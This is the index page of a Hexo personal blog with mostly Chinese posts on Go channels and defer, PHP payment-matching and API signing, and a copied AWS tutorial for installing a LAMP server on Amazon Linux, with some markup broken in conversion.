<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-golang-defer的使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/03/28/golang-defer的使用/" class="article-date">
  <time datetime="2016-03-28T08:02:37.000Z" itemprop="datePublished">2016-03-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/28/golang-defer的使用/">golang defer的使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="不能用在init-函数中"><a href="#不能用在init-函数中" class="headerlink" title="不能用在init()函数中"></a>不能用在init()函数中</h3><h3 id="程序中有用os-Exit-1-是不能执行到defer的"><a href="#程序中有用os-Exit-1-是不能执行到defer的" class="headerlink" title="程序中有用os.Exit(1)是不能执行到defer的"></a>程序中有用os.Exit(1)是不能执行到defer的</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/03/28/golang-defer的使用/" data-id="cinsnz8pj003hocpd1flulhtr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-GO-lang的面向对象的理解" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/02/18/GO-lang的面向对象的理解/" class="article-date">
  <time datetime="2016-02-18T02:04:51.000Z" itemprop="datePublished">2016-02-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/18/GO-lang的面向对象的理解/">GO-lang的面向对象的理解</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>###　对象的写法</p>
<ul>
<li>除指针外的所有类型都可以作为对象</li>
<li>对象的方法有×则可修改对象，无×不能修改对象,实际工作中，几乎全用×<br>[^code]<br>go<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="有4个类型为引用类型，即a-amp-b"><a href="#有4个类型为引用类型，即a-amp-b" class="headerlink" title="有4个类型为引用类型，即a=&amp;b"></a>有4个类型为引用类型，即a=&amp;b</h3><ul>
<li>slice</li>
<li>map </li>
<li>channel</li>
<li>interface<br>go<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//slice</span></span><br><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span>&#123;</span><br><span class="line">    first *T</span><br><span class="line">    <span class="built_in">len</span> <span class="typename">int</span></span><br><span class="line">    <span class="built_in">cap</span> <span class="typename">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//map</span></span><br><span class="line"><span class="keyword">type</span> Map_K_V <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Map[K]V <span class="keyword">struct</span>&#123;</span><br><span class="line">    imp1 *Map_K_V</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//interface</span></span><br><span class="line"><span class="keyword">type</span> <span class="keyword">interface</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    data *void</span><br><span class="line">    itab *Itab</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/02/18/GO-lang的面向对象的理解/" data-id="cinsnz8qq006vocpdmddpyyyd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-GO-lang-的学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/02/16/GO-lang-的学习笔记/" class="article-date">
  <time datetime="2016-02-16T07:24:05.000Z" itemprop="datePublished">2016-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/16/GO-lang-的学习笔记/">GO lang 的学习笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="GO-的特性"><a href="#GO-的特性" class="headerlink" title="GO 的特性"></a>GO 的特性</h2><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><p>goroutine ,比线程更小， runtime.GOMAXPROCS(n) 告知调度器同时使用多个线程</p>
<h3 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h3><p>hannel接收和发送数据都是阻塞的</p>
<h3 id="range-和close-code"><a href="#range-和close-code" class="headerlink" title="range 和close [^code]"></a>range 和close [^code]</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> Test() &#123;</span><br><span class="line">    c: =<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="typename">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">go</span> fibonacci(<span class="built_in">cap</span>(c), c)</span><br><span class="line">    <span class="keyword">for</span> i: =<span class="keyword">range</span> c &#123; <span class="comment">//使用range操作缓存类型的channel</span></span><br><span class="line">        fmt.Println(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">func</span> fibonacci(n <span class="typename">int</span>, c <span class="keyword">chan</span> <span class="typename">int</span>) &#123;</span><br><span class="line">    x,</span><br><span class="line">    y: =<span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i: =<span class="number">0</span>;</span><br><span class="line">    i &lt; n;</span><br><span class="line">    i++&#123;</span><br><span class="line">        c &lt; -x</span><br><span class="line">        x,</span><br><span class="line">        y = y,</span><br><span class="line">        x + y</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(c) <span class="comment">//在生产者的地方关闭channel，而不是在消费的地方去关闭它，这样容易起panic。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">select</span></span><br><span class="line"><span class="keyword">func</span> Test() &#123;</span><br><span class="line">    c: =<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="typename">int</span>)</span><br><span class="line">    quit: =<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="typename">int</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="keyword">func</span>() &#123;</span><br><span class="line">        <span class="keyword">for</span> i: =<span class="number">0</span>;</span><br><span class="line">        i &lt; <span class="number">10</span>;</span><br><span class="line">        i++&#123;</span><br><span class="line">            fmt.Println( &lt; -c)</span><br><span class="line">        &#125;</span><br><span class="line">        quit &lt; -<span class="number">0</span></span><br><span class="line">    &#125; ()</span><br><span class="line">    fibonacci(c, quit)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">func</span> fibonacci(c, quit <span class="keyword">chan</span> <span class="typename">int</span>) &#123;</span><br><span class="line">    x,</span><br><span class="line">    y: =<span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123; <span class="comment">//*select 默认是阻塞的，只要当监听的channel中发送或者接收可以进行时，才会运行。</span></span><br><span class="line">        <span class="keyword">case</span> c &lt; -x: <span class="comment">//*当多个channel都准备好的时候，select是随机选择一个执行的。</span></span><br><span class="line">            x,</span><br><span class="line">            y = y,</span><br><span class="line">            x + y</span><br><span class="line">        <span class="keyword">case</span> &lt; -quit:</span><br><span class="line">            fmt.Println(<span class="string">"quit"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">"do some thing "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://studygolang.com/articles/1538" target="_blank" rel="external">原文</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/02/16/GO-lang-的学习笔记/" data-id="cinsnz8qr006wocpdhlxpfv31" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/02/16/hello-world/" class="article-date">
  <time datetime="2016-02-16T06:58:09.000Z" itemprop="datePublished">2016-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/16/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/02/16/hello-world/" data-id="cinsnz8ph003eocpdf8uwq9pq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-php-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9b-b8-e5-8a-a0-e6-98-af-e7-bb-99-e5-ae-9a-e7-9a-84-e4-b8-80-e4-b8-aa-e6-95-b0-ef-bc-8c-e6-b1-82-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9a-84-e7-bb-84-e5-90-88" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/12/15/php-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9b-b8-e5-8a-a0-e6-98-af-e7-bb-99-e5-ae-9a-e7-9a-84-e4-b8-80-e4-b8-aa-e6-95-b0-ef-bc-8c-e6-b1-82-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9a-84-e7-bb-84-e5-90-88/" class="article-date">
  <time datetime="2015-12-15T11:21:53.000Z" itemprop="datePublished">2015-12-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/mi/">mi</a>►<a class="article-category-link" href="/categories/mi/PHP/">PHP</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/15/php-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9b-b8-e5-8a-a0-e6-98-af-e7-bb-99-e5-ae-9a-e7-9a-84-e4-b8-80-e4-b8-aa-e6-95-b0-ef-bc-8c-e6-b1-82-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9a-84-e7-bb-84-e5-90-88/">PHP 多个值相加是给定的一个数，求多个值的组合</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>业务场景如下：</p>
<p>物流赔付款确认环节，财务上传银行流水，物流方已知赔付总金额，要从流水中勾选出这次业务的记录总金额在已知总金额的误差范围内。</p>
<p>数据示例：</p>
<p>目标数据array(333,22,4444,55555,1)   总金额：355.  结果应该是array(333,22)</p>
<p>思路：</p>
<p>① 由于赔付款多数还是一笔或者很少几笔打过来的，所以从一个组合到两个组合这样去寻找合适的组合。</p>
<p>② 如数据示例所示，总金额可能小于某些值，所以先把大于总金额的数据过滤掉， 如把4444,55555过滤掉。</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/12/15/php-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9b-b8-e5-8a-a0-e6-98-af-e7-bb-99-e5-ae-9a-e7-9a-84-e4-b8-80-e4-b8-aa-e6-95-b0-ef-bc-8c-e6-b1-82-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9a-84-e7-bb-84-e5-90-88/" data-id="cinsnz8oh001bocpdmsm2zppa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e6-8e-a5-e5-8f-a3-e5-af-b9-e6-8e-a5-e9-aa-8c-e7-ad-be-e9-9c-80-e8-a6-81-e6-b3-a8-e6-84-8f-e7-9a-84-e9-97-ae-e9-a2-98" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/12/14/e6-8e-a5-e5-8f-a3-e5-af-b9-e6-8e-a5-e9-aa-8c-e7-ad-be-e9-9c-80-e8-a6-81-e6-b3-a8-e6-84-8f-e7-9a-84-e9-97-ae-e9-a2-98/" class="article-date">
  <time datetime="2015-12-14T09:22:37.000Z" itemprop="datePublished">2015-12-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/mi/">mi</a>►<a class="article-category-link" href="/categories/mi/PHP/">PHP</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/14/e6-8e-a5-e5-8f-a3-e5-af-b9-e6-8e-a5-e9-aa-8c-e7-ad-be-e9-9c-80-e8-a6-81-e6-b3-a8-e6-84-8f-e7-9a-84-e9-97-ae-e9-a2-98/">接口对接验签需要注意的问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;</p>
<p>我们经常有个感觉，面试问的问题高大上，做的事情就是刚毕业的学生做的。</p>
<p>是因为大公司讲究团队做事的能力，所以讲究原理上的问题，尤其是与别人协商方案或者是对接接口的时候。</p>
<p>对接接口注意下面问题.：</p>
<p>验签或者数据格式，不同语言不同风格的处理，要明确怎么encode的，</p>
<p>我通常和andorid对接，有三点：</p>
<p>①一般是给map格式，实际上是json_encode(..json_unescaped_unicode)的结果</p>
<p>②为了排序一般不带键值。</p>
<p>③ 注意其他语言的强类型，要注意明确各数据的类型。</p>
<p>我和GO对接的时候，是采用的http_build_query方式的验签。注意下面的：</p>
<p>①GO不支持数组，数据也是要json的</p>
<p>②为了排序一般不带键值。</p>
<p>③ 注意其他语言的强类型，要注意明确各数据的类型。</p>
<p>以上两种都类似，我这废话了。主要用到的函数有：</p>
<p>json_encode,</p>
<p>json_encode(..json_unescaped_unicode)</p>
<p>urlencode</p>
<p>rawurlencode</p>
<p>http_build_query</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/12/14/e6-8e-a5-e5-8f-a3-e5-af-b9-e6-8e-a5-e9-aa-8c-e7-ad-be-e9-9c-80-e8-a6-81-e6-b3-a8-e6-84-8f-e7-9a-84-e9-97-ae-e9-a2-98/" data-id="cinsnz8q1004zocpdoeix8hen" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-9c-a8linux-e4-b8-8a-e9-9d-a2-e5-ae-89-e8-a3-85-lamp-web-e6-9c-8d-e5-8a-a1-e5-99-a8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/12/07/e5-9c-a8linux-e4-b8-8a-e9-9d-a2-e5-ae-89-e8-a3-85-lamp-web-e6-9c-8d-e5-8a-a1-e5-99-a8/" class="article-date">
  <time datetime="2015-12-07T11:17:09.000Z" itemprop="datePublished">2015-12-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux/">Linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/07/e5-9c-a8linux-e4-b8-8a-e9-9d-a2-e5-ae-89-e8-a3-85-lamp-web-e6-9c-8d-e5-8a-a1-e5-99-a8/">在LINUX上面安装 LAMP Web 服务器</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <div><br><br># 教程：安装 LAMP Web 服务器（在 Amazon Linux 上）<br><br></div><br>通过以下步骤，您可以将支持 PHP 和 MySQL 的 Apache Web 服务器（有时称为 LAMP Web 服务器或 LAMP 堆栈）安装到您 Amazon Linux 实例上。您可以使用此服务器来托管静态网站或部署能对数据库中的信息执行读写操作的动态 PHP 应用程序。<br><br>先决条件<br><br>本教程假定您已经启动具有可从 Internet 访问的公有 DNS 名称的实例。有关更多信息，请参阅<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/ec2-launch-instance_linux.html" title="启动 Amazon EC2 实例" target="_blank" rel="external">启动 Amazon EC2 实例</a>。还必须将安全组配置为允许 <code>SSH</code>（端口 22）、<code>HTTP</code>（端口 80）和<code>HTTPS</code>（端口 443）连接。有关这些先决条件的更多信息，请参阅 <a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/get-set-up-for-amazon-ec2.html" title="Amazon EC2 的设置" target="_blank" rel="external">Amazon EC2 的设置</a>。<br><div><br><br>Important<br><br>这些过程适用于 Amazon Linux。有关其他发布版本的更多信息，请参阅其具体文档。<strong>如果您尝试在 Ubuntu 实例上设置 LAMP Web 服务器，则本教程不适合您。</strong>有关 Ubuntu 上的 LAMP Web 服务器的信息，请转到 Ubuntu 社区文档<a href="https://help.ubuntu.com/community/ApacheMySQLPHP" target="_blank" rel="external">ApacheMySQLPHP</a> 主题。<br><br></div><br><div><a name="d0e4372"></a><strong>安装和启动 LAMP Web 服务器（在 Amazon Linux 上）</strong><br><br>1.  <a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/ec2-connect-to-instance-linux.html" title="连接到您的实例" target="_blank" rel="external">连接到您的实例</a>。<br>2.  为确保您的所有软件包都处于最新状态，请对您的实例执行快速软件更新。此过程可能需要几分钟的时间，但必须确保您拥有最新的安全更新和缺陷修复。<br><div><br><br>Note<br><br><code>-y</code> 选项安装更新时不提示确认。如果您希望在安装前检查更新，则可以忽略此选项。<br><br></div><br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo yum update -y</code><strong></strong></pre><br><br>3.  您的实例处于最新状态后，便可以安装 Apache Web 服务器、MySQL 和 PHP 软件包。使用yum install<strong> 命令可同时安装多个软件包和所有相关依赖项。<br><pre>`[ec2-user ~]$ </pre></strong><code>sudo yum install -y httpd24 php56 mysql55-server php56-mysqlnd<code>**&lt;/code&gt;&lt;/pre&gt;

4.  启动 Apache Web 服务器。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>sudo service httpd start`</code></strong> Starting httpd: [ OK ]</code><br><br>5.  使用 <strong>chkconfig</strong> 命令将 Apache Web 服务器配置为在每次系统启动时启动。<br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo chkconfig httpd on</code><strong></strong></pre><br><div><br><br>Tip<br><br>当您成功启用服务时，chkconfig<strong> 命令不提供任何确认消息。您可以通过运行以下命令验证 </strong>httpd<strong> 是否已启用。<br><br></strong></div><br><pre>`[ec2-user ~]$ <code>chkconfig –list httpd<code>** httpd 0:off 1:off 2:on 3:on 4:on 5:on 6:off&lt;/code&gt;&lt;/pre&gt;
在运行级别 2、3、4 和 5 下，**httpd** 为</code>on<code>（您希望看到的状态）。
6.  测试您的 Web 服务器。在 Web 浏览器中，输入您实例的公有 DNS 地址（或公有 IP 地址），您应该可以看到 Apache 测试页面。您可以使用 Amazon EC2 控制台获取实例的公有 DNS（勾选 Public DNS (公有 DNS) 列；如果此列处于隐藏状态，请单击 Show/Hide (显示/隐藏) 图标并选择 Public DNS (公有 DNS)）。
&lt;div&gt;

Tip

如果您未能看到 Apache 测试页面，请检查您使用的安全组是否包含允许</code>HTTP<code>（端口 80）流量的规则。有关将</code>HTTP<code>规则添加到您安全组的信息，请参阅 [向安全组添加规则](https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/using-network-security.html#adding-security-group-rule &quot;向安全组添加规则&quot;)。

&lt;/div&gt;
&lt;div&gt;

Important

如果您使用的不是 Amazon Linux，则还可能需要在实例上配置防火墙才能允许这些连接。有关如何配置防火墙的更多信息，请参阅适用于特定分配的文档。

&lt;/div&gt;
&lt;div&gt;![](https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/images/apache_test_page2.4.png)&lt;/div&gt;
&lt;div&gt;

Note

该测试页面仅在</code>/var/www/html<code>无内容时显示。将内容添加到文档根目录后，您的内容将显示在您实例的公有 DNS 地址中，而不显示在本测试页面。

&lt;/div&gt;
&lt;/div&gt;
Apache**httpd** 提供的文件保存在称为 Apache 文档根目录的目录中。Amazon Linux Apache 文档根目录是</code>/var/www/html<code>，默认情况下归</code>root<code>所有。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>ls -l /var/www`</code></strong> total 16 drwxr-xr-x 2 root root 4096 Jul 12 01:00 cgi-bin drwxr-xr-x 3 root root 4096 Aug 7 00:02 error drwxr-xr-x 2 root root 4096 Jan 6 2012 html drwxr-xr-x 3 root root 4096 Aug 7 00:02 icons </code></pre><br>要允许 <code>ec2-user</code> 操作此目录中的文件，您需修改其所有权和权限。有多种方法可以完成此任务；在本教程中，您可以将 <code>www</code> 组添加到您的实例，然后赋予该组 <code>/var/www</code> 目录的所有权并为该组添加写入权限。随后，该组的所有成员都将能够为 Web 服务器添加、删除和修改文件。<br><div><a name="SettingFilePermissions"></a><strong>设置文件权限</strong><br><br>1.  将 <code>www</code> 组添加到您的实例。<br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo groupadd www</code><strong></strong></pre><br><br>2.  将您的用户（这里指 <code>ec2-user</code>）添加到 <code>www</code>。<br><pre>`[ec2-user ~]$ <code>sudo usermod -a -G www <em><code>ec2-user`</code></em></code><strong></strong></pre><br><div><br><br>Important<br><br>您必须先退出，再重新登录，然后才能接受新组。您可以使用 exit<strong> 命令，也可以关闭终端窗口。<br><br></strong></div><br>3.  先退出，再重新登录，然后验证您是否为 <code>www</code> 组的成员。<br><br>    1.  退出。<br><pre>`[ec2-user ~]$ <code>exit<code>**&lt;/code&gt;&lt;/pre&gt;

        2.  重新连接到实例，然后运行以下命令，以验证您是否为</code>www<code>组的成员。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>groups`</code></strong> ec2-user wheel www</code></pre><br><br>4.  将 <code>/var/</code> 及其内容的组所有权更改到 <code>www</code>www 组。<br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo chown -R root:www /var/www</code><strong></strong></pre><br><br>5.  更改 <code>/var/www</code> 及其子目录的目录权限，以添加组写入权限和设置未来子目录上的组 ID。<br><pre>`[ec2-user ~]$ <code>sudo chmod 2775 /var/www<code>** [ec2-user ~]$ **</code>find /var/www -type d -exec sudo chmod 2775 {} +<code>**&lt;/code&gt;&lt;/pre&gt;

6.  递归更改</code>/var/www<code>及其子目录的文件权限，以添加组写入权限。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>find /var/www -type f -exec sudo chmod 0664 {} +`</code></strong></code></pre><br></div><br>现在，<code>ec2_user</code>（以及 <code>www</code> 组的任何未来成员）可以在 Apache 根目录中添加、删除和编辑文件。现在您已准备好添加内容，例如静态网站或 PHP 应用程序。<br><div><a name="d0e4605"></a><strong>测试您的 LAMP Web 服务器</strong><br><br>如果您的服务器已安装并运行，且文件权限设置正确，则您的 <code>ec2-user</code> 账户应该能够在<code>/var/www/html</code> 目录（可从 Internet 访问）中创建一个简单的 PHP 文件。<br><br>1.  在 Apache 文档根目录中创建一个简单的 PHP 文件。<br><pre><code>[ec2-user ~]$ **&lt;code&gt;echo &quot;&amp;lt;?php phpinfo(); ?&amp;gt;&quot; &amp;gt; /var/www/html/phpinfo.php</code><strong></strong></pre><br><div><br><br>Tip<br><br>尝试运行此命令时，如果出现“<code>Permission denied</code>”错误，请尝试先退出，再重新登录，以接受您在 <a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/install-LAMP.html#SettingFilePermissions" title="设置文件权限" target="_blank" rel="external">设置文件权限</a> 中配置的适当组权限。<br><br></div><br>2.  在 Web 浏览器中，输入您刚刚创建的文件的 URL。此 URL 是实例的公用 DNS 地址，后接正斜杠和文件名。例如：<br><pre><code>http://_&lt;code&gt;my.public.dns.amazonaws.com</code>_/phpinfo.php</pre><br>您应该可以看到 PHP 信息页面。<br><div><img src="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/images/phpinfo5.6.6.png" alt=""></div><br><div><br><br>Note<br><br>如果您未看到此页面，请验证上一步中是否已正确创建<code>/var/www/html/phpinfo.php</code> 文件。您也可以使用以下命令验证是否安装了所有必需的程序包（第二列中的程序包版本不需要与此示例输出匹配）：<br><pre>`[ec2-user ~]$ <code>sudo yum list installed httpd24 php56 mysql55-server php56-mysqlnd<code>** Loaded plugins: priorities, update-motd, upgrade-helper 959 packages excluded due to repository priority protections Installed Packages httpd24.x86_64 2.4.16-1.62.amzn1 @amzn-main mysql55-server.x86_64 5.5.45-1.9.amzn1 @amzn-main php56.x86_64 